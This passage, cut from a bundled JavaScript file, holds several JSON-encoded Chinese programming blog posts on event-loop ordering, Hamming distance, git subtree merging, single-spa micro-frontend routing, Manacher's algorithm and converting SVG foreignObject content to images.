id=\\"guan-yu-settimeout\\">关于setTimeout</h3>\\n<p>当调用多个<code>setTimeout</code>在时间到达并且要回到栈执行的时候,它们是执行一个，清空栈，再执行下一个，每次执行完一次，都会检查一次<code>微任务队列</code></p>\\n<p>例如（测试在浏览器中）：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-built_in\\">Promise</span>.resolve().then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n   <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">1</span>);\\n   setTimeout(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n     <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">2</span>);\\n   });\\n });\\n\\nsetTimeout(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">3</span>);\\n  <span class=\\"hljs-built_in\\">Promise</span>.resolve().then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">4</span>);\\n  });\\n});</code></pre></code></pre>\\n<p>这里的执行顺序是<code>1342</code>，<code>Promise</code>会在每次单个<code>setTimeout</code>执行后，检查<code>微任务队列</code>。</p>\\n<h3 id=\\"guan-yu-setimmediate\\">关于<code>setImmediate</code></h3>\\n<p>触发速度在这4个中最慢的一个，同样跟<code>setTimeout</code>加入队列中等待触发，他们的行为比较怪异，在浏览器和在<code>node</code>各不相同，比较少联合使用。</p>\\n","toc":[{"anchor":"chu-fa-su-du-pai-xu","level":3,"text":"触发速度排序"},{"anchor":"guan-yu-wei-ren-wu-dui-lie","level":3,"text":"关于<code>微任务队列</code>"},{"anchor":"guan-yu-nexttick-dui-lie","level":3,"text":"关于<code>nextTick队列</code>"},{"anchor":"guan-yu-settimeout","level":3,"text":"关于setTimeout"},{"anchor":"guan-yu-setimmediate","level":3,"text":"关于<code>setImmediate</code>"}],"relatedTags":null,"created_at":"2018-12-29","timeArr":[2018,11,29,0,0,0,0],"title":"setTimeout&Promise&nextTick&setImmediate比较","uuid":"32f90eaf4808bb2b560d3a1c843cd785de0f72cc","summary":"<h4>触发速度排序</h4>\\n<p><code>nextTick</code> → <code>Promise</code> → <code>setTimeout</code> → <code>setImmediate</code></p>\\n<h4>关于<code>微任务队列</code></h4>\\n<p>每当JS执行栈为空，会立刻检查<code>微任务队列</code>，当发现队列存在任务，立即执行，执行完毕，栈为空，继续检测...</p>\\n<h4>关于<code>nextTick队列</code></h4>\\n<p>在...</p>","slug":"setTimeout-Promise-nextTick-setImmediate-bi-jiao","sha":"b589bdc846b64d945f730a0f8dd8320bf5473996"}')},637:function(n){n.exports=JSON.parse('{"content":"<p>通常海明距离的计算使用 <code>^</code>，再计算1的次数</p>\\n<p>但如果遇到大量数据，并且需要计算相互的海明距离，这种方法就不合适了，因为每次计算1的次数相对消耗是巨大的</p>\\n<p>另一种计算海明距离的方法：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n* <span class=\\"hljs-doctag\\">@param </span>nums {Array}\\n* <span class=\\"hljs-doctag\\">@returns <span class=\\"hljs-type\\">{number}</span></span>\\n*/</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcHam</span>(<span class=\\"hljs-params\\">nums</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> total=<span class=\\"hljs-number\\">0</span>,binCount\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;<span class=\\"hljs-number\\">32</span>;i++){\\n    binCount=<span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> j=<span class=\\"hljs-number\\">0</span>;j&lt;nums.length;j++){\\n          binCount+=(nums[j] &gt;&gt; i) &amp; <span class=\\"hljs-number\\">1</span>\\n    }\\n    total+=binCount*(nums.length-binCount)\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> total\\n}</code></pre></code></pre>\\n<p>这里主要是 <code>&gt;&gt;</code> 和 <code>&amp;</code>，实现对每一个数据进行位数处理</p>\\n<p>思路是：</p>\\n<p>1、对每一个数据进行右移 i位<code>nums[j] &gt;&gt; i</code> ，得出 k</p>\\n<p>2、对 k 进行 <code>k &amp; 1</code>， 1 的二进制是<code>...00001</code>，因此可以判断出 k 的最后1位是 1 还是 0，所以<code>binCount</code>就是最后一位为1的数量</p>\\n<p>3、<code>binCount*(nums.length-binCount)</code> ，其中<code>nums.length-binCount</code>指最后一位是0的数量，因此<code>1的数量*0的数量</code>，也就是它们能组合的海明距离</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-23","timeArr":[2018,7,23,0,0,0,0],"title":"深入海明距离","uuid":"a5bed495fbfaa670dcb632ac350bfa5c527e6eca","summary":"<p>通常海明距离的计算使用 <code>^</code>，再计算1的次数</p>\\n<p>但如果遇到大量数据，并且需要计算相互的海明距离，这种方法就不合适了，因为每次计算1的次数相对消耗是巨大的</p>\\n<p>另一种计算海明距离的方法：</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n* <span class=\\"hljs-doctag\\">@param </span>nums {Array}\\n* <span class=\\"hljs-doctag\\">@returns <span class=\\"hljs-type\\">{number}</span></span>\\n*/</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">cal</span>...</span></code></pre>","slug":"shen-ru-hai-ming-ju-li","sha":"4a3568d093ea0316f644a973e4b91143b8563bd4"}')},638:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"bu-zhou-jie-shi\\">步骤解释</h4>\\n<ol>\\n<li><p>创建remote连接\\ngit remote add 自定义远程仓库名 远程仓库地址 远程仓库分支</p>\\n</li>\\n<li><p>添加subtree \\ngit subtree add --prefix=当前仓库的子目录名称(可以使用/进行分割)  远程仓库地址 远程仓库分支 &lt;--squash&gt;添加squash则不保存子目录的git记录</p>\\n</li>\\n</ol>\\n<h4 id=\\"an-li\\">案例</h4>\\n<ul>\\n<li>当前目录<code>e:/project/demo-list</code></li>\\n</ul>\\n<ul>\\n<li><p>远程目录1：<code>d:/demo1</code></p>\\n<p>  分支：<code>master</code></p>\\n<pre><code><pre class=\\"hljs\\"><code>  demo1\\n    |——1.txt\\n    |——2.txt\\n    |——3.txt</code></pre></code></pre></li>\\n<li><p>远程目录2：<code>d:/demo2</code></p>\\n<p>  分支：<code>dev</code></p>\\n<pre><code><pre class=\\"hljs\\"><code>  demo2\\n    |——1.png\\n    |——2.png\\n    |——3.png</code></pre></code></pre></li>\\n<li><p>预期结果，保存远程目录的git记录</p>\\n<pre><code><pre class=\\"hljs\\"><code>  demo-list\\n    |——src\\n      |——demo1\\n        |——1.txt\\n        |——2.txt\\n        |——3.txt\\n      |——demo2\\n        |——1.png\\n        |——2.png\\n        |——3.png</code></pre></code></pre></li>\\n<li><p>初始化</p>\\n</li>\\n</ul>\\n<ol>\\n<li><code>cd demo-list</code></li>\\n<li><code>git init</code></li>\\n<li>添加<code>.gitignore</code>或者<code>readme.md</code>，然后commit，push让当前目录有master分支</li>\\n</ol>\\n<ul>\\n<li>第一个demo</li>\\n</ul>\\n<ol>\\n<li><code>git remote add d1 d:/demo1 master</code></li>\\n<li><code>git subtree add --prefix=src/demo1  d:/demo1 master</code></li>\\n<li><code>git remote remove d1</code></li>\\n</ol>\\n<ul>\\n<li>第二个demo</li>\\n</ul>\\n<ol>\\n<li><code>git remote add d2 d:/demo2 dev</code></li>\\n<li><code>git subtree add --prefix=src/demo2 d:/demo2 dev</code></li>\\n<li><code>git remote remove d2</code></li>\\n</ol>\\n","toc":[{"anchor":"bu-zhou-jie-shi","level":4,"text":"步骤解释"},{"anchor":"an-li","level":4,"text":"案例"}],"relatedTags":null,"created_at":"2018-10-15","timeArr":[2018,9,15,0,0,0,0],"title":"使用git-subtree合并多个仓库并保存git记录","uuid":"8f18e156230f2d648d08410062a8bf8183c0628e","summary":"<h4>步骤解释：</h4>\\n<ol>\\n<li>\\n<p>创建remote连接\\ngit remote add 自定义远程仓库名 远程仓库地址 远程仓库分支</p>\\n</li>\\n<li>\\n<p>添加subtree\\ngit subtree add --prefix=当前仓库的子目录名称(可以使用/进行分割)  远程仓库地址 远程仓库分支 &lt;--squash&gt;添加squash则...</p>\\n</li>\\n</ol>","slug":"shi-yong-git-subtree-he-bing-duo-ge-cang-ku-bing-bao-cun-git-ji-lu","sha":"45b974064ac9411014a451c0abd392f2b223e760"}')},639:function(n){n.exports=JSON.parse('{"content":"<p><code>single-spa</code>一个页面路由管理工具，当一个页面存在多个框架<code>React</code>, <code>Vue</code>, <code>Angular</code>等等时，单个框架路由已经不能适用，需要一个纯粹的<code>js</code>路由进行管理。</p>\\n<h4 id=\\"xiang-mu-jie-gou\\">项目结构</h4>\\n<pre><code><pre class=\\"hljs\\"><code>├── index.js\\n├── react-blog\\n|  ├── ...other files（内部路由）\\n|  └── index.js\\n└── vue-diy-resume\\n   ├── ...other files（内部路由）\\n   └── index.js</code></pre></code></pre><p>其中</p>\\n<ul>\\n<li><code>index.js</code>是<code>single-spa</code>的启动页面，也是<code>webpack</code>的<code>entry</code>路径。</li>\\n<li><code>react-blog/index.js</code>是<code>React</code>项目的启动页</li>\\n<li><code>vue-diy-resume/index.js</code>是<code>Vue</code>项目的启动页</li>\\n</ul>\\n<p>需要对原项目的启动页做出一些修改，也是比较容易的</p>\\n<blockquote>\\n<p>single-spa根据顶级路由查找应用，而每个应用会处理自身的子路由</p>\\n</blockquote>\\n<p>对于每一个子应用，需要暴露出3个<code>Promise</code>，分别是<code>bootstrap</code>, <code>mount</code>, <code>unmount</code>， 另外还有一个<code>unload</code> (移除) 是可选的</p>\\n<ul>\\n<li><code>bootstrap</code>: <code>single-spa</code>的子应用启动功能</li>\\n<li><code>mount</code>：当前子应用挂载后执行(类似于component的生命周期)</li>\\n<li><code>unmount</code>：当前子应用卸载后执行</li>\\n</ul>\\n<p>对应每个前端框架已经有现成的插件可以使用，因此我们不需要太多需要做的，只需要将应用传递即可</p>\\n<h4 id=\\"react\\">React</h4>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// react-blog/index.js(使用 single-spa-react)</span>\\n\\n<span class=\\"hljs-keyword\\">import</span> React <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'react\'</span>\\n<span class=\\"hljs-keyword\\">import</span> ReactDOM <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'react-dom\'</span>\\n<span class=\\"hljs-keyword\\">import</span> App <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./App\'</span>\\n<span class=\\"hljs-keyword\\">import</span> singleSpaReact <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'single-spa-react\'</span>\\n\\n\\n<span class=\\"hljs-keyword\\">const</span> reactLifecycles = singleSpaReact({\\n  React,\\n  ReactDOM,\\n  <span class=\\"hljs-attr\\">rootComponent</span>: App,\\n  domElementGetter,\\n})\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">bootstrap</span>(<span class=\\"hljs-params\\">props</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> reactLifecycles.bootstrap(props)\\n}\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">mount</span>(<span class=\\"hljs-params\\">props</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> reactLifecycles.mount(props)\\n}\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">unmount</span>(<span class=\\"hljs-params\\">props</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> reactLifecycles.unmount(props)\\n}\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">domElementGetter</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  <span class=\\"hljs-comment\\">// Make sure there is a div for us to render into</span>\\n  <span class=\\"hljs-keyword\\">let</span> el = <span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\'react-root\'</span>)\\n  <span class=\\"hljs-keyword\\">if</span> (!el) {\\n    el = <span class=\\"hljs-built_in\\">document</span>.createElement(<span class=\\"hljs-string\\">\'div\'</span>)\\n    el.id = <span class=\\"hljs-string\\">\'react-root\'</span>\\n    <span class=\\"hljs-built_in\\">document</span>.body.appendChild(el)\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> el\\n}\\n</code></pre></code></pre>\\n<h4 id=\\"vue\\">Vue</h4>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// vue-diy-resume/index.js</span>\\n\\n<span class=\\"hljs-keyword\\">import</span> vuetify <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./vuetify\'</span>\\n<span class=\\"hljs-keyword\\">import</span> Vue <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'vue\'</span>\\n<span class=\\"hljs-keyword\\">import</span> Main <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./Main\'</span>\\n<span class=\\"hljs-keyword\\">import</span> routes <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./router\'</span>\\n<span class=\\"hljs-keyword\\">import</span> singleSpaVue <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'single-spa-vue\'</span>\\n\\n\\nVue.use(...)\\nVue.use(...)\\n\\n<span class=\\"hljs-keyword\\">const</span> vueLifecycles = singleSpaVue({\\n    Vue,\\n    <span class=\\"hljs-attr\\">appOptions</span>: {\\n        <span class=\\"hljs-attr\\">vuetify</span>:vuetify,\\n        router,\\n        <span class=\\"hljs-attr\\">el</span>: <span class=\\"hljs-string\\">\'#vue-root\'</span>,\\n        <span class=\\"hljs-attr\\">render</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">h</span> =&gt;</span> h(Main)\\n    }\\n})\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">const</span> bootstrap = [\\n    vueLifecycles.bootstrap,\\n]\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">const</span> mount = [\\n    vueLifecycles.mount,\\n]\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">const</span> unmount = [\\n    vueLifecycles.unmount,\\n]\\n</code></pre></code></pre>\\n<p>子应用的启动页写好了，就是主页面汇总，定义路由，定义当前路由的激活函数(判断当前路径<code>window.location</code>是否可以进入子应用)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// index.js</span>\\n\\n<span class=\\"hljs-keyword\\">import</span> * <span class=\\"hljs-keyword\\">as</span> singleSpa <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'single-spa\'</span>\\n\\nsingleSpa.registerApplication(<span class=\\"hljs-string\\">\'blog\'</span>, () =&gt; <span class=\\"hljs-keyword\\">import</span> (<span class=\\"hljs-string\\">\'./react-blog/index\'</span>), blogPathPrefix(<span class=\\"hljs-string\\">\'/\'</span>))\\nsingleSpa.registerApplication(<span class=\\"hljs-string\\">\'diy-resume\'</span>, ()=&gt;<span class=\\"hljs-keyword\\">import</span> (<span class=\\"hljs-string\\">\'./vue-diy-resume/index\'</span>), projectPathPrefix(<span class=\\"hljs-string\\">\'/diy-resume\'</span>))\\n\\nsingleSpa.start()\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">blogPathPrefix</span>(<span class=\\"hljs-params\\">prefix</span>) </span>{\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">location</span>) </span>{\\n        <span class=\\"hljs-keyword\\">if</span>(location.pathname.startsWith(<span class=\\"hljs-string\\">\'/diy-resume\'</span>))<span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">false</span>\\n        <span class=\\"hljs-keyword\\">return</span> location.pathname.startsWith(<span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${prefix}</span>`</span>)\\n    }\\n}\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">projectPathPrefix</span>(<span class=\\"hljs-params\\">prefix</span>) </span>{\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">location</span>) </span>{\\n        <span class=\\"hljs-keyword\\">return</span> location.pathname.startsWith(<span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${prefix}</span>`</span>)\\n    }\\n}\\n</code></pre></code></pre>\\n<p>现在应用已经识别<code>single-spa</code>路由系统，如何在应用内部跳转到另一个应用？</p>\\n<p><code>single-spa</code>提供一个全局函数<code>window.singleSpaNavigate</code>，接收参数为路由路径</p>\\n","toc":[{"anchor":"xiang-mu-jie-gou","level":4,"text":"项目结构"},{"anchor":"react","level":4,"text":"React"},{"anchor":"vue","level":4,"text":"Vue"}],"relatedTags":null,"created_at":"2021-06-07","timeArr":[2021,5,7,0,0,0,0],"title":"single-spa-微前端的路由管理系统","uuid":"386fc98fbb6d77826458755f0e09b60919b215bc","summary":"<p><code>single-spa</code>一个页面路由管理工具，当一个页面存在多个框架<code>React</code>, <code>Vue</code>, <code>Angular</code>等等时，单个框架路由已经不能适用，需要一个纯粹的<code>js</code>路由进行管理。</p>\\n<h4>项目结构：</h4>\\n<pre class=\\"hljs\\"><code>├── index.js\\n├── react-blog\\n|  ├── ...other files...</code></pre>","slug":"single-spa-wei-qian-duan-de-lu-you-guan-li-xi-tong","sha":"68aa212db545b2cf71c29d34fbbce9f30fe3e228"}')},640:function(n){n.exports=JSON.parse('{"content":"<p>思路：利用对称思想</p>\\n<ol>\\n<li><p>先将原字符串转换成转换成 <code>#x$x$x$</code> 的形式(一定是奇数)</p>\\n</li>\\n<li><p>p为一个数组，储存每一个值的最大回文数量的一半+1，例如：&#39;ababa&#39; 对应的p 就是<code>[1,2,3,2,1]</code></p>\\n</li>\\n<li><p><code>max</code>为当前已经计算过得最大回文量<code>p[id]</code>+对应的位置<code>id</code>，默认为0或者-infinity，可以保证最后的max和id不为0</p>\\n</li>\\n<li><p>遍历变形的字符串，指针为<code>i</code></p>\\n<p> <code>i</code>在当前<code>max</code>所涵盖的范围内，如下图，<code>i</code>在<code>max</code>范围内，<code>j</code>是对称的点</p>\\n<pre><code><pre class=\\"hljs\\"><code>   j        i\\n ------id------</code></pre></code></pre><p> 分4种情况:</p>\\n<ol>\\n<li><p><code>j</code>超出范围，那么<code>i</code>只取范围内</p>\\n<pre><code><pre class=\\"hljs\\"><code> ---j---      -i-\\n   ------id------              </code></pre></code></pre></li>\\n<li><p><code>j</code>边界刚好在范围上，不仅将<code>i</code>设置，并且还要继续扩展<code>i</code>，因为虽然<code>j</code>左边不存在，但<code>i</code>的右边不确定</p>\\n<pre><code><pre class=\\"hljs\\"><code>  --j--    --i--\\n  ------id------   =&gt;  继续扩展i</code></pre></code></pre></li>\\n<li><p><code>j</code>边界在范围内，只需要简单赋值给<code>i</code>即可，因为此时<code>j</code>和<code>i</code>的值完全相等</p>\\n<pre><code><pre class=\\"hljs\\"><code>  -j-      -i-\\n ------id------</code></pre></code></pre></li>\\n<li><p><code>i</code>不在当前<code>max</code>所涵盖的范围内，需要扩展</p>\\n<pre><code><pre class=\\"hljs\\"><code>               i\\n------id------     =&gt; 需要扩展i</code></pre></code></pre></li>\\n</ol>\\n</li>\\n<li><p>最后扩展完后重新定义<code>p[i]</code>和<code>max</code>，<code>id</code>，最终<code>2*(max-id)-1</code>就是最大子回文字符串长度</p>\\n</li>\\n</ol>\\n<p>代码：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>  <span class=\\"hljs-title\\">manacher</span>(<span class=\\"hljs-params\\">s</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 这里不论奇偶，都将s转换成 \'#x$x$x$\' 的形式</span>\\n  <span class=\\"hljs-keyword\\">let</span> str=<span class=\\"hljs-string\\">\'#\'</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;s.length;i++) str+=s[i]+<span class=\\"hljs-string\\">\'$\'</span>\\n  <span class=\\"hljs-comment\\">// p为一个数组，储存每一个值的最大回文数量的一半+1，例如：\'ababa\' 对应的p 就是[1,2,3,2,1]</span>\\n  <span class=\\"hljs-keyword\\">let</span> p=[<span class=\\"hljs-number\\">1</span>]\\n  <span class=\\"hljs-comment\\">// max为当前已经计算过得最大回文量(p[id])+对应的位置(id)，默认为0或者-infinity，可以保证最后的max和id不为0</span>\\n  <span class=\\"hljs-keyword\\">let</span> max=<span class=\\"hljs-number\\">0</span>,id=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-comment\\">// 暴力计算时，从左右什么位置开始进行对比</span>\\n  <span class=\\"hljs-keyword\\">let</span> temp=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-comment\\">// newCenter是目前需要重新暴力计算的位置</span>\\n  <span class=\\"hljs-keyword\\">let</span> newCenter=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-comment\\">// 从第一个开始遍历，第0个不用管，是\'#\'</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">1</span>;i&lt;str.length;i++){\\n    <span class=\\"hljs-comment\\">// i在当前max所涵盖的范围内，如下图，i在max范围内，j是对称的点</span>\\n    <span class=\\"hljs-comment\\">/*\\n      *        j        i\\n      *      ------id------\\n    * */</span>\\n    <span class=\\"hljs-keyword\\">if</span>(max&gt;i){\\n      <span class=\\"hljs-comment\\">// 在范围内对称的位置</span>\\n      <span class=\\"hljs-keyword\\">let</span> j=id-(i-id)\\n      <span class=\\"hljs-comment\\">// 通过boundary判断对称位置那个是否会超出范围</span>\\n      <span class=\\"hljs-keyword\\">let</span> boundary=p[j]+i\\n      <span class=\\"hljs-comment\\">// j超出范围，那么i只取范围内，如下图</span>\\n      <span class=\\"hljs-comment\\">/*\\n      *    ---j---      -i-\\n      *      ------id------\\n      * */</span>\\n      <span class=\\"hljs-keyword\\">if</span>(boundary&gt;max){\\n        p[i]=p[j]-(boundary-max)\\n        <span class=\\"hljs-keyword\\">continue</span>;\\n      <span class=\\"hljs-comment\\">// j边界刚好在范围上，不仅将i设置，并且还要继续扩展i，即设置newCenter和temp</span>\\n        <span class=\\"hljs-comment\\">/*\\n        *      --j--    --i--\\n        *      ------id------   =&gt;  继续扩展i\\n        * */</span>\\n      }<span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span>(boundary===max){\\n        temp=p[j]\\n        newCenter=i\\n      <span class=\\"hljs-comment\\">// j边界在范围内，只需要简单赋值给i即可，因为此时j和i的值完全相等</span>\\n        <span class=\\"hljs-comment\\">/*\\n        *       -j-      -i-\\n        *      ------id------\\n        * */</span>\\n      }<span class=\\"hljs-keyword\\">else</span>{\\n        p[i]=p[j]\\n        <span class=\\"hljs-keyword\\">continue</span>;\\n      }\\n      <span class=\\"hljs-comment\\">// i不在当前max所涵盖的范围内，需要暴力计算，如下图</span>\\n      <span class=\\"hljs-comment\\">/*\\n        *                     i\\n        *      ------id------     =&gt; 需要扩展i\\n      * */</span>\\n    }<span class=\\"hljs-keyword\\">else</span>{\\n      temp=<span class=\\"hljs-number\\">1</span>\\n      newCenter=i\\n    }\\n    <span class=\\"hljs-comment\\">// 暴力计算</span>\\n    <span class=\\"hljs-keyword\\">while</span>(newCenter-temp&gt;=<span class=\\"hljs-number\\">0</span> &amp;&amp; newCenter+temp &lt;str.length &amp;&amp; str[newCenter-temp]===str[newCenter+temp]){\\n      temp++\\n    }\\n    <span class=\\"hljs-comment\\">// 暴力计算完后重新定义p[i]和max，id</span>\\n    p[i]=temp\\n    <span class=\\"hljs-keyword\\">if</span>(p[i]&gt;max-id){\\n      max=p[i]+i\\n      id=i\\n    }\\n  }\\n  <span class=\\"hljs-comment\\">// 此时2*(max-id)-1就是最大回文字符串的length</span>\\n\\n  <span class=\\"hljs-comment\\">// 去掉# 和 $符号</span>\\n  <span class=\\"hljs-keyword\\">let</span> res=str[id],realRes=<span class=\\"hljs-string\\">\'\'</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">1</span>;i&lt;max-id;i++){\\n    res=str[id-i]+res+str[id+i]\\n  }\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;res.length;i++){\\n    <span class=\\"hljs-keyword\\">if</span>(res[i]===<span class=\\"hljs-string\\">\'$\'</span> || res[i]===<span class=\\"hljs-string\\">\'#\'</span>)<span class=\\"hljs-keyword\\">continue</span>\\n    realRes+=res[i]\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> realRes\\n}</code></pre></code></pre>\\n<p>测试：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> test=[<span class=\\"hljs-string\\">\\"abb\\"</span>,<span class=\\"hljs-string\\">\\"a\\"</span>,<span class=\\"hljs-string\\">\\"aaaabaaa\\"</span>,<span class=\\"hljs-string\\">\\"bb\\"</span>,<span class=\\"hljs-string\\">\\"ccc\\"</span>,<span class=\\"hljs-string\\">\'abbxz\'</span>,<span class=\\"hljs-string\\">\'accbcca\'</span>,<span class=\\"hljs-string\\">\'\'</span>,<span class=\\"hljs-string\\">\'abaxabaxabybaxabyb\'</span>]\\n<span class=\\"hljs-keyword\\">let</span> answer=[<span class=\\"hljs-string\\">\'bb\'</span>,<span class=\\"hljs-string\\">\'a\'</span>,<span class=\\"hljs-string\\">\'aaabaaa\'</span>,<span class=\\"hljs-string\\">\'bb\'</span>,<span class=\\"hljs-string\\">\'ccc\'</span>,<span class=\\"hljs-string\\">\'bb\'</span>,<span class=\\"hljs-string\\">\'accbcca\'</span>,<span class=\\"hljs-string\\">\'\'</span>,<span class=\\"hljs-string\\">\'baxabybaxab\'</span>]\\n<span class=\\"hljs-keyword\\">let</span> res\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;test.length;i++){\\nres=manacher(test[i])\\n  <span class=\\"hljs-built_in\\">console</span>.log(res===answer[i])\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-27","timeArr":[2018,7,27,0,0,0,0],"title":"算法记录-最长回文子字符串","uuid":"af105b2df12bc15528a731d149193b4aa9927533","summary":"<p>思路：利用对称思想</p>\\n<ol>\\n<li>先将原字符串转换成转换成 <code>#x$x$x$</code> 的形式(一定是奇数)</li>\\n<li>p为一个数组，储存每一个值的最大回文数量的一半+1，例如：\'ababa\' 对应的p 就是<code>[1,2,3,2,1]</code></li>\\n<li><code>max</code>为当前已经计算过得最大回文量<code>p[id]</code>+对应的位置<code>id</code>，默认为0或者-infi...</li>\\n</ol>","slug":"suan-fa-ji-lu-zui-chang-hui-wen-zi-zi-fu-chuan","sha":"b43da9771d20a5bb5e735c832af36f85b932df54"}')},641:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"foreignobject\\">foreignObject</h2>\\n<p>svg内部标签<code>&lt;foreignObject&gt;</code>，可以直接在svg内部插入<code>xhtml</code>元素，再通过<code>blob</code>和<code>FileReader</code>可\\n将内部<code>xhtml</code>内容转换成<em>同源</em>url，再通过<code>img.src=url</code>将svg内部的dom元素转化为图片。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span>  data = <span class=\\"hljs-string\\">`\\n&lt;svg xmlns=\\"http://www.w3.org/2000/svg\\" width=\\"100\\" height=\\"150\\"&gt;\\n  &lt;foreignObject width=\\"100%\\" height=\\"100%\\"&gt;\\n    &lt;div xmlns=\\"http://www.w3.org/1999/xhtml\\" style=\\"width:100px;\\"&gt;\\n       &lt;span&gt;some text&lt;/span&gt;\\n    &lt;/div&gt;\\n  &lt;/foreignObject&gt;\\n&lt;/svg&gt;`</span>;\\n<span class=\\"hljs-keyword\\">let</span> img = <span class=\\"hljs-keyword\\">new</span> Image();\\n<span class=\\"hljs-keyword\\">let</span> svg = <span class=\\"hljs-keyword\\">new</span> Blob([data], {<span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'image/svg+xml;charset=utf-8\'</span>});\\n<span class=\\"hljs-keyword\\">let</span> fr=<span class=\\"hljs-keyword\\">new</span> FileReader()\\nfr.readAsDataURL(svg)\\n<span class=\\"hljs-keyword\\">let</span> url\\nfr.onload=<span class=\\"hljs-function\\"><span 